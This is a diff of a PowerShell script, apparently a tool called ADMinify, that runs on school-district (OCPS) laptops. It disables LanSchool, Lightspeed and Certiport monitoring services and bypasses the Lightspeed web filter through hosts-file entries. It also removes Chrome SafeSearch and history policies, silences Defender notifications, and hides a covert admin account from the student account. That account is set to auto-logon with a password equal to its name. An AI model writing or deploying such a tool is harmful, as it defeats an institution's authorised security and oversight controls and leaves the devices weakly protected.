-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanSchoolStudent" -Name "Start" -Value 4 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\LanSchoolStudent" -Name "Start" -Value 4 -Type DWord -Force
 
 		# LanSchool Helper service startup.
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanSchoolHelper" -Name "Start" -Value 4 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\LanSchoolHelper" -Name "Start" -Value 4 -Type DWord -Force
 
 		# LanSchool Configuration scheduled task.
 			Disable-ScheduledTask -TaskName "LanSchool Configuration" > $null
 
 		# Lightspeed CO Capture startup.
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder" -Name "Capture.lnk" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder" -Name "Capture.lnk" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
 
 		# Lightspeed Management Agent service startup.
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LMA_Service" -Name "Start" -Value 4 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\LMA_Service" -Name "Start" -Value 4 -Type DWord -Force
 
 		# Chrome Manager service startup.
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ChromeManager" -Name "Start" -Value 4 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\ChromeManager" -Name "Start" -Value 4 -Type DWord -Force
 
 	<#┌─────────────────────────────────────────────┐
-	  │ Disable Other Crap Processes                │
+	  │ Disable Other Shit Processes                │
 	  └─────────────────────────────────────────────┘#>
 		# Word Accessbility Checker scheduled task.
 			Disable-ScheduledTask -TaskName "Add Accessibility Checker to Word's Ribbon" > $null
 
 		# Acrobat Update service startup.
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AdobeARMservice" -Name "Start" -Value 4 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\AdobeARMservice" -Name "Start" -Value 4 -Type DWord -Force
 
 		# Acrobat Update scheduled task.
 			Disable-ScheduledTask -TaskName "Adobe Acrobat Update Task" > $null
 
 		# ActroTray startup.
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32" -Name "Acrobat Assistant 8.0" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32" -Name "Acrobat Assistant 8.0" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
 
 		# Adobe GC Invoker Utility startup.
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "AdobeGCInvoker-1.0" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "AdobeGCInvoker-1.0" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
 
 		# Adobe GC Invoker scheduled tasks.
 			Get-ScheduledTask -TaskName "AdobeGCInvoker-*" | Disable-ScheduledTask > $null
 
 		# Adobe Genuine Monitor service startup.
 			if (Test-Path -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\AGMService") {
-				Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AGMService" -Name "Start" -Value 4 -Type DWord -Force
+				Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\AGMService" -Name "Start" -Value 4 -Type DWord -Force
 			}
 
 		# Adobe Genuine Software Integrity service startup.
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AGSService" -Name "Start" -Value 4 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\AGSService" -Name "Start" -Value 4 -Type DWord -Force
 
 		# Adobe Updater startup.
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "AdobeAAMUpdater-1.0" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "AdobeAAMUpdater-1.0" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
 
 		# Certiport Lockdown service startup.
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Certiport.Lockdown.Service" -Name "Start" -Value 4 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\Certiport.Lockdown.Service" -Name "Start" -Value 4 -Type DWord -Force
 
 		# CertiportNow service startup.
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CertiportNow" -Name "Start" -Value 4 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\CertiportNow" -Name "Start" -Value 4 -Type DWord -Force
 
 		# Flash Player scheduled tasks.
 			Get-ScheduledTask -TaskName "Adobe Flash Player *" | Disable-ScheduledTask > $null
@@ -502,33 +502,33 @@ if ($InstallMode -eq "Install" -or $InstallMode -eq "Update") {
 			Disable-ScheduledTask -TaskName "OCPS Device Provisioning" > $null
 
 		# Safari Montage Pingback service startup.
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SML PingBack" -Name "Start" -Value 4 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\SML PingBack" -Name "Start" -Value 4 -Type DWord -Force
 
 		# Service Host-8214 startup.
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder" -Name "Service Host - 8214.lnk" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder" -Name "Service Host - 8214.lnk" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
 
 		# SMART Ink startup.
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32" -Name "SMART Ink" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32" -Name "SMART Ink" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
 
 		# SMART Helper service startup.
 			if (Test-Path -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\SMARTHelperService") {
-				Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SMARTHelperService" -Name "Start" -Value 4 -Type DWord -Force
+				Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\SMARTHelperService" -Name "Start" -Value 4 -Type DWord -Force
 			}
 
 		# SMART Node Launcher startup.
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32" -Name "sbsdk-server" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32" -Name "sbsdk-server" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
 
 		# SMART Notification startup.
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32" -Name "SMARTNotification" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32" -Name "SMARTNotification" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
 
 		# Sync Java Exceptions scheduled task.
 			Disable-ScheduledTask -TaskName "Sync Java Exceptions List" > $null
 
 		# xdAD Workstation Client startup.
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "xdADWSClient" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "xdADWSClient" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
 
 		# xdAD Workstation service startup.
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\xdADWSService" -Name "Start" -Value 4 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\xdADWSService" -Name "Start" -Value 4 -Type DWord -Force
 
 	<#┌─────────────────────────────────────────────┐
 	  │ Bypass Lightspeed Filter                    │
@@ -542,7 +542,7 @@ if ($InstallMode -eq "Install" -or $InstallMode -eq "Update") {
 		Add-HostsEntry -Address "127.0.0.1" -Hostname "mobile.lsfilter.com"
 
 	<#┌─────────────────────────────────────────────┐
-	  │ Other OCPS Request Redirections             │
+	  │ Block Other OCPS Domains                    │
 	  └─────────────────────────────────────────────┘#>
 		Add-HostsEntry -Address "127.0.0.1" -Hostname "aelcmmpa1.ocps.net"
 		Add-HostsEntry -Address "127.0.0.1" -Hostname "aelcmmpa1.ocps.k12.fl.us"
@@ -579,11 +579,11 @@ else {
 }
 '@
 
-			$GovernorScript | Out-File "$env:systemdrive\slashpowered\Startup Governor.ps1" -Encoding UTF8 -Force
+			$GovernorScript | Out-File "$env:SYSTEMDRIVE\slashpowered\Startup Governor.ps1" -Force
 			Remove-Variable GovernorScript
 
 		# Scheduled Task
-			$GVAct = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -File `"$env:systemdrive\slashpowered\Startup Governor.ps1`" -ExecutionPolicy Bypass"
+			$GVAct = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -File `"$env:SYSTEMDRIVE\slashpowered\Startup Governor.ps1`" -ExecutionPolicy Bypass"
 			$GVTrg = New-ScheduledTaskTrigger -AtLogOn
 			$GVSet = New-ScheduledTaskSettingsSet
 			$GVTsk = New-ScheduledTask -Action $GVAct -Trigger $GVTrg -Settings $GVSet
@@ -594,7 +594,7 @@ else {
 	<#┌─────────────────────────────────────────────┐
 	  │ Local Machine Registry Changes              │
 	  └─────────────────────────────────────────────┘#>
-		# Disable blocked Google Chrome settings/features.
+		# Disable Google Chrome restrictions and other policies.
 			Remove-ItemProperty -LiteralPath "HKLM:\Software\Policies\Google\Chrome" -Name "AllowDeletingBrowserHistory" -Force
 			Remove-ItemProperty -LiteralPath "HKLM:\Software\Policies\Google\Chrome" -Name "ForceGoogleSafeSearch" -Force
 			Remove-ItemProperty -LiteralPath "HKLM:\Software\Policies\Google\Chrome" -Name "ForceYouTubeRestrict" -Force
@@ -608,7 +608,7 @@ else {
 			Remove-ItemProperty -LiteralPath "HKLM:\Software\Policies\Google\Chrome" -Name "SavingBrowserHistoryDisabled" -Force
 			Remove-ItemProperty -LiteralPath "HKLM:\Software\Policies\Google\Chrome" -Name "ShowHomeButton" -Force
 
-		# Disable "Switch user" option to prevent Group Policy weirdness.
+		# Disable "Switch user" button to isolate slashpowered admin from the student account.
 			if (!(Test-Path -LiteralPath "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System")) {
 				New-Item -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force > $null
 			}
@@ -636,28 +636,28 @@ else {
 
 			New-ItemProperty -LiteralPath "HKLM:\Software\Policies\Microsoft\Windows\OOBE" -Name "DisablePrivacyExperience" -Value 1 -PropertyType DWord -Force > $null
 
-		# Disable mobile hotspot restriction.
+		# Disable mobile hotspot restrictions.
 			if (!(Test-Path -LiteralPath "HKLM:\Software\Policies\Microsoft\Windows\Network Connections")) {
 				New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\Network Connections" -Force > $null
 			}
 
 			New-ItemProperty -LiteralPath "HKLM:\Software\Policies\Microsoft\Windows\Network Connections" -Name "NC_ShowSharedAccessUI" -Value 1 -PropertyType DWord -Force > $null
 
-		# Disable Xbox Game DVR restriction.
+		# Disable Xbox Game DVR restrictions.
 			if (!(Test-Path -LiteralPath "HKLM:\Software\Policies\Microsoft\Windows\GameDVR")) {
 				New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\GameDVR" -Force > $null
 			}
 
 			New-ItemProperty -LiteralPath "HKLM:\Software\Policies\Microsoft\Windows\GameDVR" -Name "AllowGameDVR" -Value 1 -PropertyType DWord -Force > $null
 
-		# Don't make temporary profile if creation error.
+		# Don't create a temporary profile if slashpowered profile is corrupted.
 			if (!(Test-Path -LiteralPath "HKLM:\Software\Policies\Microsoft\Windows\System")) {
 				New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\System" -Force > $null
 			}
 
 			New-ItemProperty -LiteralPath "HKLM:\Software\Policies\Microsoft\Windows\System" -Name "ProfileErrorAction" -Value 1 -PropertyType DWord -Force > $null
 
-		# Disable annoying firewall notifs. every minute.
+		# Disable the annoying firewall notifications every minute.
 			if (!(Test-Path -LiteralPath "HKLM:\Software\Policies\Microsoft\Windows Defender Security Center\Notifications")) {
 				New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows Defender Security Center\Notifications" -Force > $null
 			}
@@ -665,21 +665,21 @@ else {
 			New-ItemProperty -LiteralPath "HKLM:\Software\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -PropertyType DWord -Force > $null
 			New-ItemProperty -LiteralPath "HKLM:\Software\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Value 1 -PropertyType DWord -Force > $null
 
-		# Disable attempt to connect to OCPS Wi-Fi for first account login.
+		# Disable automatically connecting to OCPS Wi-Fi during logon.
 			if (!(Test-Path -LiteralPath "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon")) {
 				New-Item -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Force > $null
 			}
 
 			New-ItemProperty -LiteralPath "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "SyncForegroundPolicy" -Value 0 -PropertyType DWord -Force > $null
 
-		# Disable restricted school store catalog.
+		# Allow installing non-OCPS apps from the Microsoft Store.
 			if (!(Test-Path -LiteralPath "HKLM:\Software\Policies\Microsoft\WindowsStore")) {
 				New-Item -Path "HKLM:\Software\Policies\Microsoft\WindowsStore" -Force > $null
 			}
 
 			New-ItemProperty -LiteralPath "HKLM:\Software\Policies\Microsoft\WindowsStore" -Name "RequirePrivateStoreOnly" -Value 0 -PropertyType DWord -Force > $null
 
-		# Disable laptop power throttling for performance.
+		# Disable laptop power throttling to improve gaming performance.
 			if (!(Test-Path -LiteralPath "HKLM:\System\CurrentControlSet\Control\Power\PowerThrottling")) {
 				New-Item -Path "HKLM:\System\CurrentControlSet\Control\Power\PowerThrottling" -Force > $null
 			}
@@ -843,17 +843,17 @@ New-ItemProperty -LiteralPath "HKCU:\Software\Microsoft\Windows\CurrentVersion\G
 New-ItemProperty -LiteralPath "HKCU:\System\GameConfigStore" -Name "GameDVR_Enabled" -Value 1 -PropertyType DWord -Force
 
 New-ItemProperty -LiteralPath "HKCU:\Software\Microsoft\Windows\OneDrive" -Name "DisableFileSyncNGSC" -Value 1 -PropertyType DWord -Force
-Remove-Item -Path "$env:USERPROFILE\OneDrive" -Force -Recurse
-Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\OneDrive" -Force -Recurse
-Remove-Item -Path "$env:PROGRAMDATA\Microsoft OneDrive" -Force -Recurse
-Remove-Item -Path "C:\OneDriveTemp" -Force -Recurse
+Remove-Item -LiteralPath "$env:USERPROFILE\OneDrive" -Force -Recurse
+Remove-Item -LiteralPath "$env:LOCALAPPDATA\Microsoft\OneDrive" -Force -Recurse
+Remove-Item -LiteralPath "$env:PROGRAMDATA\Microsoft OneDrive" -Force -Recurse
+Remove-Item -LiteralPath "$env:SYSTEMDRIVE\OneDriveTemp" -Force -Recurse
 
 if (!(Test-Path "HKCR:")) {
 	New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT
 }
 
-Remove-Item -Path "HKCR:\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}" -Recurse
-Remove-Item -Path "HKCR:\Wow6432Node\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}" -Recurse
+Remove-Item -LiteralPath "HKCR:\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}" -Recurse
+Remove-Item -LiteralPath "HKCR:\Wow6432Node\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}" -Recurse
 
 New-ItemProperty -LiteralPath "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "AutoAdminLogon" -Value 0 -PropertyType DWord -Force
 New-ItemProperty -LiteralPath "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "ForceAutoLogon" -Value 0 -PropertyType DWord -Force
@@ -871,22 +871,22 @@ Remove-Item -LiteralPath "$env:SYSTEMDRIVE\Windows\Temp\ADminify" -Recurse -Forc
 Remove-Item -LiteralPath "$PSCommandPath" -Force
 '@
 
-		$PostScript | Out-File "$env:systemdrive\slashpowered\Post-Configuration.ps1" -Encoding UTF8 -Force
+		$PostScript | Out-File "$env:SYSTEMDRIVE\slashpowered\Post-Configuration.ps1" -Force
 		Remove-Variable PostScript
 
-		# Add account configuration script to RunOnce registry.
-			Write-Host "[INFO] Adding post-configuration script to RunOnce startup..."
+		# Configure the post-configuration script to run on slashpowered first logon.
+			Write-Host "[INFO] Adding post-configuration script to startup registry..."
 
 			if (!(Test-Path -LiteralPath "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce")) {
 				New-Item -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Force > $null
 			}
 
-			New-ItemProperty -LiteralPath "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "slashpowered Account Configuration" -Value "PowerShell.exe -NoLogo -NoProfile -File `"$env:systemdrive\slashpowered\Post-Configuration.ps1`" -ExecutionPolicy Bypass" -PropertyType String -Force > $null
+			New-ItemProperty -LiteralPath "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "slashpowered Account Configuration" -Value "PowerShell.exe -NoLogo -NoProfile -File `"$env:SYSTEMDRIVE\slashpowered\Post-Configuration.ps1`" -ExecutionPolicy Bypass" -PropertyType String -Force > $null
 
 	<#┌─────────────────────────────────────────────┐
-	  │ AutoLogon for Quick Setup                   │
+	  │ Auto Logon for Quick Setup                  │
 	  └─────────────────────────────────────────────┘#>
-		# Temporarily activate auto-login for account configuration.
+		# Temporarily activate automatic logon for account configuration.
 			if (!(Test-Path -LiteralPath "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon")) {
 				New-Item -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Force > $null
 			}
@@ -896,24 +896,24 @@ Remove-Item -LiteralPath "$PSCommandPath" -Force
 			New-ItemProperty -LiteralPath "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultUserName" -Value "$env:COMPUTERNAME\$Admin" -PropertyType String -Force > $null
 			New-ItemProperty -LiteralPath "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultPassword" -Value "$Admin" -PropertyType String -Force > $null
 
-			# Workaround for some computrs not logging in.
+			# Workaround for some student's computers not logging in.
 				if (Test-Path -LiteralPath "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonCount") {
 					Remove-ItemProperty -LiteralPath "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "AutoLogonCount" -Force
 				}
 
-		# Legal notice displays regardless of autologin, disabed for seamless configuration.
+		# The legal notice overrides auto logon, temporarily disabled for seamless configuration.
 			Rename-ItemProperty -LiteralPath "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LegalNoticeCaption" -NewName "LegalNoticeCaption.slash" -Force
 			Rename-ItemProperty -LiteralPath "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LegalNoticeText" -NewName "LegalNoticeText.slash" -Force
 }
 
 
-<#┌─────────────────────────────────────────────────────────────────────────────────────────────┐
-  │ Script Finished                                                                             │
-  └─────────────────────────────────────────────────────────────────────────────────────────────┘#>
+<#┌──────────────────────────────────────────────────────────────────────────────────────────┐
+  │ Script Finished                                                                          │
+  └──────────────────────────────────────────────────────────────────────────────────────────┘#>
 	<#┌─────────────────────────────────────────────┐
 	  │ Continue Prompt                             │
 	  └─────────────────────────────────────────────┘#>
-		# If Installing
+		# If installing...
 			if ($InstallMode -eq "Install") {
 				Write-Host "`n[USER] Restart required to complete ADMinify installation. Press any key to restart..." -NoNewline
 				$Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") > $null
@@ -922,7 +922,7 @@ Remove-Item -LiteralPath "$PSCommandPath" -Force
 				Exit
 			}
 
-		# If Uninstalling
+		# If uninstalling...
 			if ($InstallMode -eq "Uninstall") {
 				Write-Host "`n[DONE] Restart required to cleanup ADminify. Press any key to restart..." -NoNewline
 				$Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") > $null
@@ -931,7 +931,7 @@ Remove-Item -LiteralPath "$PSCommandPath" -Force
 				Exit
 			}
 
-		# If Updating
+		# If updating...
 			if ($InstallMode -eq "Update") {
 				Write-Host "`n[USER] Restart required to complete ADMinify update. Press any key to restart..." -NoNewline
 				$Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") > $null
